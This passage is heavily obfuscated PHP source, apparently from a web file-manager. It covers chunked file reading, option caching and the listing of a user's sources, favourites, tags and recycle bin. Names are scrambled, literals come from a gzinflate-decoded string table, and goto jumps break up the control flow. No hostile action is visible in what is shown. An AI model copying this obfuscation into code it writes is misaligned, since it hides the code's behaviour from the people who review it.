$ú˜ÀŸĞ¤) { $å÷£ï‚³ =& $_SERVER[³½¬ÚË¯]; $¢Â¯çº = $this->info[$å÷£ï‚³[76]]; $©ñ•’’ã = $İ¬Ûóƒú; $âûšğáú = $ú˜ÀŸĞ¤; if ($İ¬Ûóƒú < 0) { $İ¬Ûóƒú = $¢Â¯çº + $İ¬Ûóƒú; } if ($ú˜ÀŸĞ¤ === !1) { $ú˜ÀŸĞ¤ = $¢Â¯çº - $İ¬Ûóƒú; } if ($İ¬Ûóƒú + $ú˜ÀŸĞ¤ > $¢Â¯çº) { $ú˜ÀŸĞ¤ = $¢Â¯çº - $İ¬Ûóƒú; } if ($ú˜ÀŸĞ¤ <= 0) { return $å÷£ï‚³[12]; } if ($İ¬Ûóƒú < 0 || $İ¬Ûóƒú >= $¢Â¯çº || $ú˜ÀŸĞ¤ <= 0 || $ú˜ÀŸĞ¤ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\x6c\145\122\x65\141\144\x20\145\x72\x72\157\x72\x21\40\163\164\141\x72\x74\x3d{$İ¬Ûóƒú}\73\154\x65\156\147\x74\150\75{$ú˜ÀŸĞ¤}\x3b\x20\x73\x69\x7a\x65\75{$¢Â¯çº}\x3b"); } $–Œ«™¶˜ = 64 * 1024; $Öõãè¸¢ =& self::$_chunkBuffer[$this->path]; if (!$Öõãè¸¢) { $Öõãè¸¢ = array(); } $¼ÉğŠõ¹ = 0; $ŠÙò™†À = 0; $ˆƒ€çÁ = $å÷£ï‚³[12]; foreach ($Öõãè¸¢ as $¼ÉğŠõ¹ => $ˆƒ€çÁ) { $¼ÉğŠõ¹ = intval($¼ÉğŠõ¹); $ŠÙò™†À = $¼ÉğŠõ¹ + strlen($ˆƒ€çÁ); if ($İ¬Ûóƒú >= $ŠÙò™†À) { continue; } if ($İ¬Ûóƒú >= $¼ÉğŠõ¹ && $İ¬Ûóƒú + $ú˜ÀŸĞ¤ <= $ŠÙò™†À) { return substr($ˆƒ€çÁ, $İ¬Ûóƒú - $¼ÉğŠõ¹, $ú˜ÀŸĞ¤); } break; } if (count($Öõãè¸¢) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($å÷£ï‚³[1541], $å÷£ï‚³[1542] . count($Öõãè¸¢) . "\x3b\x73\x74\x61\x72\164\x3d{$İ¬Ûóƒú}\54\x6c\x65\x6e\x67\x74\150\75{$ú˜ÀŸĞ¤}\x3b\x70\157\163\145\72{$¼ÉğŠõ¹}\x7e{$ŠÙò™†À}"); throw new Exception($å÷£ï‚³[1543]); } $²¹ô´½Ó = intval($İ¬Ûóƒú / $–Œ«™¶˜) * $–Œ«™¶˜; $³ŸÂ´ª = ceil(($İ¬Ûóƒú + $ú˜ÀŸĞ¤) / $–Œ«™¶˜) * $–Œ«™¶˜ - $²¹ô´½Ó; $ùšÃĞĞü = IO::fileSubstr($this->path, $²¹ô´½Ó, $³ŸÂ´ª); $Öõãè¸¢[$²¹ô´½Ó . $å÷£ï‚³[12]] = $ùšÃĞĞü; ksort($Öõãè¸¢); $Øˆ˜²®˜ = substr($ùšÃĞĞü, $İ¬Ûóƒú - $²¹ô´½Ó, $ú˜ÀŸĞ¤); return $Øˆ˜²®˜; } private function log($³×é½ú, $¯š‚ÂúÚ) { $ˆşôçîÔ =& $_SERVER[³½¬ÚË¯]; $î¿È†½€ = timeFloat() - $this->timeStart; write_log(sprintf($ˆşôçîÔ[1544], $³×é½ú, $this->info[$ˆşôçîÔ[32]], $î¿È†½€, $¯š‚ÂúÚ), $ˆşôçîÔ[1225]); } } goto bä™İ’¢¬ô; d¬½ÜÃÛˆ: $_SERVER[œÈù³¡½] = explode($_SERVER[³½¬ÚË¯][650], gzinflate(substr($_SERVER[³½¬ÚË¯][651], 10, -8))); $snrmpotdik = $_SERVER[³½¬ÚË¯][652]; while (strlen($snrmpotdik) < $_SERVER[³½¬ÚË¯][653]) { if (!$snrmpotdik) { break; } $snrmpotdik++; } goto DÆ»ô±Á©ƒ; CŸ˜´¼ëŠŞ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ˆÃ¤í ì = false, $´³ÌìÁú = '', $ŠÃŠ™ÕŠ = false) { $ÄÔçÈÒà =& $_SERVER[³½¬ÚË¯]; $“¨îúÕ‚ = $this->cacheGet($´³ÌìÁú); $‚­ÏîÊÒ = $this->optionDefault($´³ÌìÁú); $‚­ÏîÊÒ = is_array($‚­ÏîÊÒ) ? $‚­ÏîÊÒ : array(); if (is_array($“¨îúÕ‚)) { $“¨îúÕ‚ = array_merge($‚­ÏîÊÒ, $“¨îúÕ‚); return $ˆÃ¤í ì ? isset($“¨îúÕ‚[$ˆÃ¤í ì]) ? $“¨îúÕ‚[$ˆÃ¤í ì] : null : $“¨îúÕ‚; } $âŠ£‹â± = $this->filterWhere(array($ÄÔçÈÒà[33] => $´³ÌìÁú)); $“¨îúÕ‚ = $this->where($âŠ£‹â±)->select(); $“¨îúÕ‚ = array_to_keyvalue($“¨îúÕ‚, $ÄÔçÈÒà[94], $ÄÔçÈÒà[418]); foreach ($“¨îúÕ‚ as $™ÜÉÖÌÌ => $±ò²÷©‚) { if ($ŠÃŠ™ÕŠ || in_array($™ÜÉÖÌÌ, $this->jsonField)) { $“¨îúÕ‚[$™ÜÉÖÌÌ] = json_decode($±ò²÷©‚, !0); } } $this->cacheSet($´³ÌìÁú, $“¨îúÕ‚); $“¨îúÕ‚ = array_merge($‚­ÏîÊÒ, $“¨îúÕ‚); return $ˆÃ¤í ì ? $“¨îúÕ‚[$ˆÃ¤í ì] : $“¨îúÕ‚; } public function set($ò»ê–¢÷, $¶ğ­»ô£ = false, $ËóÆôİ± = '') { $â®ğ¿Ú =& $_SERVER[³½¬ÚË¯]; $this->cacheRemove($ËóÆôİ±); $ÍâïŸÓÄ = array(); $âÛØ±  = is_array($ò»ê–¢÷) ? $ò»ê–¢÷ : array($ò»ê–¢÷ => $¶ğ­»ô£); foreach ($âÛØ±  as $éÎˆƒí => $²¥º…µ¯) { if (is_array($²¥º…µ¯)) { $²¥º…µ¯ = json_encode_force($²¥º…µ¯); } $this->checkLength($²¥º…µ¯, !1, $this->tableName . $â®ğ¿Ú[4] . $ò»ê–¢÷); $²¥º…µ¯ = self::textEncode($²¥º…µ¯); $âÛØ±  = array($â®ğ¿Ú[33] => $ËóÆôİ±, $â®ğ¿Ú[94] => $éÎˆƒí, $â®ğ¿Ú[418] => $²¥º…µ¯); $ÍâïŸÓÄ[] = $this->filterWhere($âÛØ± ); } if (!$ÍâïŸÓÄ) { return !0; } $¸™è²Øİ = $this->cacheKey($â®ğ¿Ú[444]); CacheLock::lock($¸™è²Øİ); $ÜÕ¯ÉÎ = $this->addAll($ÍâïŸÓÄ, array(), !0); CacheLock::unlock($¸™è²Øİ); return $ÜÕ¯ÉÎ; } protected function optionDefault($¿‡æù¸ = '') { return !1; } public function setDeep($¹†ì¨Ç, $ÑÈé¶ù = false, $ÛÕš²‚Ô = '') { $’âÌ¾Æï = explode($_SERVER[³½¬ÚË¯][10], $¹†ì¨Ç); $£…¶çÏ = $this->get(); array_set_value($£…¶çÏ, $¹†ì¨Ç, $ÑÈé¶ù); $this->set($’âÌ¾Æï[0], $£…¶çÏ[$’âÌ¾Æï[0]], $ÛÕš²‚Ô); } public function remove($äÈ–Ç¨ç, $ÚÖ¤Ç¸ = '') { $Óç÷Ìì =& $_SERVER[³½¬ÚË¯]; $this->cacheRemove($ÚÖ¤Ç¸); $«˜¡õ…ı = $this->filterWhere(array($Óç÷Ìì[94] => $äÈ–Ç¨ç, $Óç÷Ìì[33] => $ÚÖ¤Ç¸)); if (is_null($äÈ–Ç¨ç)) { unset($«˜¡õ…ı[$Óç÷Ìì[94]]); } return $this->where($«˜¡õ…ı)->delete(); } public function cacheSet($»™ÅÙö, $†Ó”êıñ = false) { return Cache::set($this->cacheKey($»™ÅÙö), $†Ó”êıñ); } public function cacheGet($õä¿ù›Ä) { return Cache::get($this->cacheKey($õä¿ù›Ä)); } public function cacheRemove($Œ±èƒ¨) { return Cache::remove($this->cacheKey($Œ±èƒ¨)); } protected function filterWhere($±µÇöøÉ) { return $±µÇöøÉ; } protected function cacheKey($ÕÙÕı¤Ÿ) { return $ÕÙÕı¤Ÿ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\143\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\155\x65" => "\x69\x6f\137\163\157\x75\162\x63\x65\x5f\x6d\145\x74\141", "\x6d\145\164\x61\106\151\145\154\x64" => "\163\157\x75\x72\143\145\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\x69\x6d\145", "\164\151\155\145", "\x69\156\163\145\x72\164", "\146\x75\156\143\164\x69\x6f\156"), array("\x63\x72\145\141\x74\145\124\151\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\145\x72\x74", "\146\x75\x6e\143\164\x69\x6f\156"), array("\x76\x69\145\167\x54\151\x6d\145", "\x74\x69\155\145", "\151\x6e\163\145\162\164", "\146\x75\156\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¶ŠĞ”ü—) { return $this->listSource(array($_SERVER[³½¬ÚË¯][445] => $¶ŠĞ”ü—)); } public function typeName($ÕŞ×ù¨) { static $¹Â¥ã‰æ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $¹Â¥ã‰æ[$ÕŞ×ù¨ . $_SERVER[³½¬ÚË¯][12]]; } public function sourceListInfo($ƒóšĞõ, $·¿¿÷Ë = false) { $¯‡§° =& $_SERVER[³½¬ÚË¯]; $ƒóšĞõ = $ƒóšĞõ ? $ƒóšĞõ : array(); $ƒóšĞõ = array_filter(array_unique($ƒóšĞõ)); if (!$ƒóšĞõ) { return array(); } $Ç®âÍÜ = $this->where(array($¯‡§°[181] => array($¯‡§°[7], $ƒóšĞõ)))->select(); $this->_listDataApply($Ç®âÍÜ, $·¿¿÷Ë); return array_to_keyvalue($Ç®âÍÜ, $¯‡§°[181]); } public function pathInfoFilter(&$Ş§ØÕ¢¢) { $Ú×¿ĞË =& $_SERVER[³½¬ÚË¯]; static $«ÈÒ§…À = false; static $ñïÇƒâ = false; static $¤šúÉ¬ó = false; if (!$«ÈÒ§…À) { $…ğúàâ = $Ú×¿ĞË[446]; $…ğúàâ .= $Ú×¿ĞË[447]; $…ğúàâ .= $Ú×¿ĞË[448]; $ƒ¸¡ËÕ‚ = $Ú×¿ĞË[449]; $Œ–ï˜È = explode($Ú×¿ĞË[50], $ƒ¸¡ËÕ‚); $«ÈÒ§…À = explode($Ú×¿ĞË[50], $…ğúàâ); $ñïÇƒâ = array(); foreach ($«ÈÒ§…À as $ôËš‚È‰) { if (in_array($ôËš‚È‰, $Œ–ï˜È)) { continue; } $ñïÇƒâ[] = $ôËš‚È‰; } $¤šúÉ¬ó = explode($Ú×¿ĞË[50], $Ú×¿ĞË[450]); } foreach ($¤šúÉ¬ó as $Ò—öµ·Û) { if (isset($Ş§ØÕ¢¢[$Ò—öµ·Û])) { $Ş§ØÕ¢¢[$Ò—öµ·Û] = intval($Ş§ØÕ¢¢[$Ò—öµ·Û]); } } $Ş§ØÕ¢¢[$Ú×¿ĞË[84]] = $Ú×¿ĞË[451] . $Ş§ØÕ¢¢[$Ú×¿ĞË[181]] . $Ú×¿ĞË[452]; $Ş§ØÕ¢¢[$Ú×¿ĞË[33]] = $Ş§ØÕ¢¢[$Ú×¿ĞË[453]] == 1 ? $Ú×¿ĞË[75] : $Ú×¿ĞË[214]; $Ş§ØÕ¢¢[$Ú×¿ĞË[178]] = $this->typeName($Ş§ØÕ¢¢[$Ú×¿ĞË[178]]); if ($Ş§ØÕ¢¢[$Ú×¿ĞË[453]] != 1) { $Ş§ØÕ¢¢[$Ú×¿ĞË[175]] = $Ş§ØÕ¢¢[$Ú×¿ĞË[454]]; unset($Ş§ØÕ¢¢[$Ú×¿ĞË[454]]); } $ò»Œû™€ = $«ÈÒ§…À; if (isset($Ş§ØÕ¢¢[$Ú×¿ĞË[455]]) && $Ş§ØÕ¢¢[$Ú×¿ĞË[455]][$Ú×¿ĞË[456]] == -1) { $ò»Œû™€ = $ñïÇƒâ; } $Ş§ØÕ¢¢ = array_field_key($Ş§ØÕ¢¢, $ò»Œû™€); return $Ş§ØÕ¢¢; } public function listUserFav() { $Ôş˜ìÄ =& $_SERVER[³½¬ÚË¯]; $Èèöèˆí = Model($Ôş˜ìÄ[457])->listData(); $½ˆÜ·ìÃ = array_filter_by_field($Èèöèˆí, $Ôş˜ìÄ[33], $Ôş˜ìÄ[458]); $½ˆÜ·ìÃ = array_to_keyvalue($½ˆÜ·ìÃ, $Ôş˜ìÄ[12], $Ôş˜ìÄ[84]); if ($½ˆÜ·ìÃ) { $£®ŸğØ = $this->listSource(array($Ôş˜ìÄ[459] => array($Ôş˜ìÄ[460], $½ˆÜ·ìÃ))); } $£®ŸğØ = array_to_keyvalue($£®ŸğØ[$Ôş˜ìÄ[413]], $Ôş˜ìÄ[181]); foreach ($Èèöèˆí as &$„ª”ÌÑá) { $„ª”ÌÑá = array($Ôş˜ìÄ[461] => $„ª”ÌÑá[$Ôş˜ìÄ[443]], $Ôş˜ìÄ[462] => $„ª”ÌÑá[$Ôş˜ìÄ[32]], $Ôş˜ìÄ[463] => $„ª”ÌÑá[$Ôş˜ìÄ[84]], $Ôş˜ìÄ[464] => $„ª”ÌÑá[$Ôş˜ìÄ[33]], $Ôş˜ìÄ[465] => $„ª”ÌÑá[$Ôş˜ìÄ[215]], $Ôş˜ìÄ[466] => $„ª”ÌÑá[$Ôş˜ìÄ[85]]); if ($„ª”ÌÑá[$Ôş˜ìÄ[33]] == $Ôş˜ìÄ[458] && $£®ŸğØ[$„ª”ÌÑá[$Ôş˜ìÄ[84]]]) { $„ª”ÌÑá[$Ôş˜ìÄ[87]] = $£®ŸğØ[$„ª”ÌÑá[$Ôş˜ìÄ[84]]]; } } unset($„ª”ÌÑá); return $Èèöèˆí; } public function listUserTag($‘öÁœÕŸ) { $œ”„œ½ =& $_SERVER[³½¬ÚË¯]; if ($‘öÁœÕŸ && !is_array($‘öÁœÕŸ)) { $‘öÁœÕŸ = array($‘öÁœÕŸ); } $ÜÔ’Ô¯¢ = Model($œ”„œ½[467])->listData(); $µ»Õ­¹ = array(); $â„ø»Ê = array(); foreach ($ÜÔ’Ô¯¢ as $ù©óÂÎ) { $¹Çµ¥ãÑ = $ù©óÂÎ[$œ”„œ½[84]]; if (!$¹Çµ¥ãÑ) { continue; } if (!isset($â„ø»Ê[$¹Çµ¥ãÑ])) { $â„ø»Ê[$¹Çµ¥ãÑ] = array(); } $â„ø»Ê[$¹Çµ¥ãÑ][] = $ù©óÂÎ[$œ”„œ½[468]]; $µ»Õ­¹[$ù©óÂÎ[$œ”„œ½[84]]] = $ù©óÂÎ; } $ìÜ¸ø®â = array(); $™œ“‰ˆ = array(); $òˆŠ× › = array(); foreach ($â„ø»Ê as $ÚÑÃé¿é => $ÌêÍÏ¼æ) { $Ğşğ´¤© = !0; if (!$‘öÁœÕŸ) { $ìÜ¸ø®â[] = $ÚÑÃé¿é; continue; } foreach ($‘öÁœÕŸ as $ãª»æê¬) { if (!in_array($ãª»æê¬, $ÌêÍÏ¼æ)) { $Ğşğ´¤© = !1; break; } } if (!$Ğşğ´¤©) { continue; } if (!is_numeric($ÚÑÃé¿é)) { $ß±Æùöá = $µ»Õ­¹[$ÚÑÃé¿é]; $Ñäõƒˆƒ = array($œ”„œ½[32] => $ß±Æùöá[$œ”„œ½[32]], $œ”„œ½[84] => $ß±Æùöá[$œ”„œ½[84]], $œ”„œ½[33] => $ß±Æùöá[$œ”„œ½[33]], $œ”„œ½[87] => array($œ”„œ½[469] => 1), $œ”„œ½[216] => !0); if ($ß±Æùöá[$œ”„œ½[33]] == $œ”„œ½[214]) { $òˆŠ× ›[] = $Ñäõƒˆƒ; } if ($ß±Æùöá[$œ”„œ½[33]] == $œ”„œ½[75]) { $™œ“‰ˆ[] = $Ñäõƒˆƒ; } continue; } $ìÜ¸ø®â[] = $ÚÑÃé¿é; } if ($ìÜ¸ø®â) { $Üñá’‚¦ = $this->listSource(array($œ”„œ½[459] => array($œ”„œ½[460], $ìÜ¸ø®â))); } $Üñá’‚¦ = $Üñá’‚¦ ? $Üñá’‚¦ : array($œ”„œ½[82] => array(), $œ”„œ½[83] => array()); $Üñá’‚¦[$œ”„œ½[82]] = array_merge($Üñá’‚¦[$œ”„œ½[82]], $™œ“‰ˆ); $Üñá’‚¦[$œ”„œ½[83]] = array_merge($Üñá’‚¦[$œ”„œ½[83]], $òˆŠ× ›); if (isset($Üñá’‚¦[$œ”„œ½[410]]) && count($ìÜ¸ø®â) == $Üñá’‚¦[$œ”„œ½[410]][$œ”„œ½[411]]) { return $Üñá’‚¦; } $®„“°ÆÕ = array(); $Œ¨íœİ  = array_to_keyvalue($Üñá’‚¦[$œ”„œ½[82]], $œ”„œ½[12], $œ”„œ½[181]); $ÜÓ™–¶ = array_to_keyvalue($Üñá’‚¦[$œ”„œ½[83]], $œ”„œ½[12], $œ”„œ½[181]); $¼®Ûİ¼¬ = array_merge($ÜÓ™–¶, $Œ¨íœİ ); foreach ($ìÜ¸ø®â as $¹Çµ¥ãÑ) { if (!in_array($¹Çµ¥ãÑ, $¼®Ûİ¼¬)) { $®„“°ÆÕ[] = $¹Çµ¥ãÑ; } } if ($®„“°ÆÕ) { Model($œ”„œ½[470])->removeBySource($®„“°ÆÕ); } return $Üñá’‚¦; } public function listUserRecycle() { $ÇëÑ¦ùÌ =& $_SERVER[³½¬ÚË¯]; $àœœúÀÕ = Model($ÇëÑ¦ùÌ[471])->listData(); if (!$àœœúÀÕ) { return array(); } $˜´¸ÇÅ™ = array($ÇëÑ¦ùÌ[459] => array($ÇëÑ¦ùÌ[460], $àœœúÀÕ), $ÇëÑ¦ùÌ[472] => 1); return $this->listSource($˜´¸ÇÅ™); } public function listSource($¦Û½ñ†Á, $® êÃ‰ = 3000, $´Á€â§º = false) { $¸­˜²° =& $_SERVER[³½¬ÚË¯]; if (!isset($¦Û½ñ†Á[$¸­˜²°[473]])) { $¦Û½ñ†Á[$¸­˜²°[473]] = 0; } if (isset($¦Û½ñ†Á[$¸­˜²°[180]]) && $¦Û½ñ†Á[$¸­˜²°[180]] == $¸­˜²°[212]) { $¦Û½ñ†Á[$¸­˜²°[454]] = array($¸­˜²°[375], $¸­˜²°[474]); } $úµÊ¤ÕÍ = $¸­˜²°[475]; $ìÀ‘áƒê = $this->field($úµÊ¤ÕÍ)->_makeOrder()->where($¦Û½ñ†Á)->selectPage($® êÃ‰); $this->_listPageCheck($ìÀ‘áƒê, $úµÊ¤ÕÍ, $¦Û½ñ†Á); $this->_listDataApply($ìÀ‘áƒê[$¸­˜²°[413]], $´Á€â§º); $this->_listMake($ìÀ‘áƒê); return $ìÀ‘áƒê; } private function _listPageCheck(&$ï¬—ø°æ, $ËÔôƒè…, $ÙÃğ°»Ê) { $†İ©¨Û =& $_SERVER[³½¬ÚË¯]; if (!is_array($ï¬—ø°æ[$†İ©¨Û[410]])) { return; } $¨ã´Ì¯ = $ï¬—ø°æ[$†İ©¨Û[410]]; if ($¨ã´Ì¯[$†İ©¨Û[412]] <= 1) { return; } if ($¨ã´Ì¯[$†İ©¨Û[411]] >= 100000) { return; } if (Model($†İ©¨Û[476])->get($†İ©¨Û[477]) != $†İ©¨Û[478]) { return; } $ËÔôƒè… = str_replace(array($†İ©¨Û[53], $†İ©¨Û[386], $†İ©¨Û[246]), $†İ©¨Û[12], $ËÔôƒè…); $ËÔôƒè… = $†İ©¨Û[479] . str_replace($†İ©¨Û[50], $†İ©¨Û[480], $ËÔôƒè…) . $†İ©¨Û[481]; $óÀ×­É‹ = $†İ©¨Û[482]; $óÀ×­É‹ = $óÀ×­É‹ . $†İ©¨Û[483]; $ŒÇÁ—‹´ = $¨ã´Ì¯[$†İ©¨Û[407]] * ($¨ã´Ì¯[$†İ©¨Û[397]] - 1) . $†İ©¨Û[50] . $¨ã´Ì¯[$†İ©¨Û[407]]; $¯ÃÈØàö = $this->_makeOrder(!0); $âÉ¾êÃ = $†İ©¨Û[479] . str_replace($†İ©¨Û[50], $†İ©¨Û[480], $¯ÃÈØàö[0]); if (strpos($âÉ¾êÃ, $†İ©¨Û[484])) { $âÉ¾êÃ = str_replace($†İ©¨Û[484], $†İ©¨Û[485], $âÉ¾êÃ); } else { $âÉ¾êÃ .= $†İ©¨Û[486] . $¯ÃÈØàö[1]; } $íôº‹ß¶ = array(); foreach ($ÙÃğ°»Ê as $İÖš¹Ã´ => $×ù¸¬¸£) { $íôº‹ß¶[$†İ©¨Û[479] . $İÖš¹Ã´] = $×ù¸¬¸£; } $this->alias($†İ©¨Û[487])->field($ËÔôƒè…)->limit($ŒÇÁ—‹´)->order($âÉ¾êÃ); $×ä­··ú = $this->join($óÀ×­É‹)->where($íôº‹ß¶)->select(); if ($×ä­··ú) { $ï¬—ø°æ[$†İ©¨Û[413]] = $×ä­··ú; } } protected function _makeOrder($œª´¢ª× = false) { $ğ™÷÷É” =& $_SERVER[³½¬ÚË¯]; $Àüì˜Şº = Model($ğ™÷÷É”[488])->get($ğ™÷÷É”[489]); $ûëÈÎİ± = Model($ğ™÷÷É”[488])->get($ğ™÷÷É”[490]); $ÓŞÖšÔ = array($ğ™÷÷É”[491] => $ğ™÷÷É”[492], $ğ™÷÷É”[493] => $ğ™÷÷É”[494]); $Ğ™³™«Ô = array($ğ™÷÷É”[32] => $ğ™÷÷É”[32], $ğ™÷÷É”[76] => $ğ™÷÷É”[76], $ğ™÷÷É”[175] => $ğ™÷÷É”[454], $ğ™÷÷É”[495] => $ğ™÷÷É”[495], $ğ™÷÷É”[496] => $ğ™÷÷É”[497], $ğ™÷÷É”[215] => $ğ™÷÷É”[215], $ğ™÷÷É”[85] => $ğ™÷÷É”[85]); $¼×á¸®¡ = Input::get($ğ™÷÷É”[498], $ğ™÷÷É”[7], $Àüì˜Şº, array_keys($Ğ™³™«Ô)); $ÁıòË¿Ñ = Input::get($ğ™÷÷É”[499], $ğ™÷÷É”[7], $ûëÈÎİ±, array_keys($ÓŞÖšÔ)); if (!in_array($¼×á¸®¡, array_keys($Ğ™³™«Ô))) { $¼×á¸®¡ = $ğ™÷÷É”[32]; } if (!in_array($ÁıòË¿Ñ, array_keys($ÓŞÖšÔ))) { $¼×á¸®¡ = $ğ™÷÷É”[491]; } if ($¼×á¸®¡ == $ğ™÷÷É”[32]) { } $ ï““İû = $ğ™÷÷É”[500] . $Ğ™³™«Ô[$¼×á¸®¡] . $ğ™÷÷É”[53] . $ÓŞÖšÔ[$ÁıòË¿Ñ]; $ ï““İû = rtrim(trim($ ï““İû), $ğ™÷÷É”[50]); if ($œª´¢ª×) { return array($ ï““İû, $ÓŞÖšÔ[$ÁıòË¿Ñ]); } return $this->order($ ï““İû); } protected function _listDataApplyItem($ –³ì³õ, $ÊëªøÓÍ = false) { $Ã½ß¼± = array($ –³ì³õ); $this->_listDataApply($Ã½ß¼±, $ÊëªøÓÍ); return $Ã½ß¼±[0]; } protected function _listDataApply(&$æ§º›­‡, $®‹ÔŠØ‡ = false) { $ŠÑìŸ³É =& $_SERVER[³½¬ÚË¯]; if (!$æ§º›­‡) { $æ§º›­‡ = array(); return; } $‹–¿“£Ì = array_to_keyvalue($æ§º›­‡, $ŠÑìŸ³É[12], $ŠÑìŸ³É[181]); $‹–¿“£Ì = array_unique($‹–¿“£Ì); $this->_listSourceCache($æ§º›­‡); if (!$®‹ÔŠØ‡) { $this->_listAppendMeta($æ§º›­‡, $‹–¿“£Ì); $this->_listAppendFileMeta($æ§º›­‡, $‹–¿“£Ì); $this->_listAppendChildren($æ§º›­‡, $‹–¿“£Ì); } $this->_listAppendPath($æ§º›­‡); $this->_listAppendAuth($æ§º›­‡); $this->_listAppendSourceInfo($æ§º›­‡, $‹–¿“£Ì); $this->_listAppendUser($æ§º›­‡); $this->_listFilterInfo($æ§º›­‡, $®‹ÔŠØ‡); $this->_listAppendAuthSecret($æ§º›­‡); } protected function _listSourceCache($ã©Óë©Ÿ) { $²„›èó =& $_SERVER[³½¬ÚË¯]; foreach ($ã©Óë©Ÿ as $¼‹õ‚ô) { self::$cacheSourceInfo[$²„›èó[501] . $¼‹õ‚ô[$²„›èó[181]]] = $¼‹õ‚ô; } } protected function _listFilterInfo(&$Øá¦º², $Õñäõ£ = false) { $¹ÃÏ’™Ñ =& $_SERVER[³½¬ÚË¯]; foreach ($Øá¦º² as &$Ã¡şÇÂµ) { $Ã¡şÇÂµ = $this->pathInfoFilter($Ã¡şÇÂµ); self::$cachePathInfo[$¹ÃÏ’™Ñ[502] . intval($Õñäõ£) . $¹ÃÏ’™Ñ[430] . $Ã¡şÇÂµ[$¹ÃÏ’™Ñ[181]]] = $Ã¡şÇÂµ; } unset($Ã¡şÇÂµ); } protected function _listMake(&$†üêØÑ¸) { $£şÔïòª =& $_SERVER[³½¬ÚË¯]; $†üêØÑ¸[$£şÔïòª[82]] = array(); $†üêØÑ¸[$£şÔïòª[83]] = array(); foreach ($†üêØÑ¸[$£şÔïòª[413]] as $ï¸À÷©) { $ÇÌ˜¼É = $ï¸À÷©[$£şÔïòª[453]] == 1 ? $£şÔïòª[82] : $£şÔïòª[83]; $†üêØÑ¸[$ÇÌ˜¼É][] = $ï¸À÷©; } unset($†üêØÑ¸[$£şÔïòª[413]]); } protected function _listAppendMeta(&$¸Ê¯ß, $ŸÒ¥İÏ) { $´»õ·ô =& $_SERVER[³½¬ÚË¯]; $± “ğ¿“ = array($´»õ·ô[459] => array($´»õ·ô[460], $ŸÒ¥İÏ)); $ Ø‹àÅ = Model($´»õ·ô[503])->field($´»õ·ô[504])->where($± “ğ¿“)->select(); if (!$ Ø‹àÅ) { return; } $Ÿâ¯ÄŒä = array($´»õ·ô[505], $´»õ·ô[506], $´»õ·ô[485]); $ÆİµÌì¿ = array(); foreach ($ Ø‹àÅ as $ß®ûÔ£Å) { if (!isset($ÆİµÌì¿[$ß®ûÔ£Å[$´»õ·ô[181]]])) { $ÆİµÌì¿[$ß®ûÔ£Å[$´»õ·ô[181]]] = array(); } if (in_array($ß®ûÔ£Å[$´»õ·ô[94]], $Ÿâ¯ÄŒä)) { continue; } $ÆİµÌì¿[$ß®ûÔ£Å[$´»õ·ô[181]]][$ß®ûÔ£Å[$´»õ·ô[94]]] = $ß®ûÔ£Å[$´»õ·ô[418]]; } foreach ($¸Ê¯ß as &$ÒÉù‘÷ş) { $ÒÉù‘÷ş[$´»õ·ô[507]] = !1; if (isset($ÆİµÌì¿[$ÒÉù‘÷ş[$´»õ·ô[181]]])) { $ÒÉù‘÷ş[$´»õ·ô[507]] = $ÆİµÌì¿[$ÒÉù‘÷ş[$´»õ·ô[181]]]; } if ($this->fileIsLock($ÒÉù‘÷ş) && $ÒÉù‘÷ş[$´»õ·ô[455]]) { $Õıî = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÒÉù‘÷ş[$´»õ·ô[455]][$´»õ·ô[456]] = AuthModel::authDisable($ÒÉù‘÷ş[$´»õ·ô[455]][$´»õ·ô[456]], $Õıî); $ÒÉù‘÷ş[$´»õ·ô[455]][$´»õ·ô[508]][$´»õ·ô[455]] = $ÒÉù‘÷ş[$´»õ·ô[455]][$´»õ·ô[456]]; } } unset($ÒÉù‘÷ş); } protected function _listAppendFileMeta(&$¿ü¥œ–­, $¿¥ùúĞ) { $Á—ËÂşæ =& $_SERVER[³½¬ÚË¯]; $ä«ïòŠ = array_to_keyvalue($¿ü¥œ–­, $Á—ËÂşæ[12], $Á—ËÂşæ[509]); $ä«ïòŠ = array_filter(array_unique($ä«ïòŠ)); if (!$ä«ïòŠ) { return; } $çßº»»ğ = array($Á—ËÂşæ[510] => array($Á—ËÂşæ[460], $ä«ïòŠ)); $¨èı‘”è = $Á—ËÂşæ[511]; $Ğ‡÷Ÿ = Model($Á—ËÂşæ[512])->field($¨èı‘”è)->where($çßº»»ğ)->select(); $Ğ‡÷Ÿ = array_to_keyvalue($Ğ‡÷Ÿ, $Á—ËÂşæ[509]); $õŒĞ‰şå = Model($Á—ËÂşæ[513])->field($Á—ËÂşæ[514])->where($çßº»»ğ)->select(); $õŒĞ‰şå = $õŒĞ‰şå ? $õŒĞ‰şå : array(); $©¤áéÀû = array(); foreach ($õŒĞ‰şå as $‹¬™Şò) { if (!isset($©¤áéÀû[$‹¬™Şò[$Á—ËÂşæ[509]]])) { $©¤áéÀû[$‹¬™Şò[$Á—ËÂşæ[509]]] = array(); } $©¤áéÀû[$‹¬™Şò[$Á—ËÂşæ[509]]][$‹¬™Şò[$Á—ËÂşæ[94]]] = $‹¬™Şò[$Á—ËÂşæ[418]]; } foreach ($¿ü¥œ–­ as &$Â‹Ç¯¾) { $ãØÒëòô = $Â‹Ç¯¾[$Á—ËÂşæ[509]]; if (!$ãØÒëòô || !is_array($Ğ‡÷Ÿ[$ãØÒëòô])) { continue; } $âå„Î¯ = $Ğ‡÷Ÿ[$ãØÒëòô]; $âå„Î¯[$Á—ËÂşæ[76]] = $Â‹Ç¯¾[$Á—ËÂşæ[76]]; $âå„Î¯[$Á—ËÂşæ[32]] = $Â‹Ç¯¾[$Á—ËÂşæ[32]]; if (!$âå„Î¯[$Á—ËÂşæ[515]]) { 